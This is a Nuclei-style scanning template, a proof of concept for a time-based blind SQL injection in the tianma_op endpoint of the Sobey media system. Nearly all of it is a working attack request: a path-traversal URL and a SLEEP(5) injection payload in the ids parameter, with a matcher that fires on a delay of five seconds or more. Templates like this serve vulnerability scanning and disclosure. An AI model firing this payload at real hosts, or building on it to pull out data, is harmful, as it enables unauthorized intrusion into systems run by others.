id: poc-or3qa5lkgd17hwvc
info:
  name: 索贝融媒体系统 tianma_op 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    opstatus=up&siteCode=1&token=1&ids=1'') OR (SELECT * FROM (SELECT(SLEEP(5)))x)--+x'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
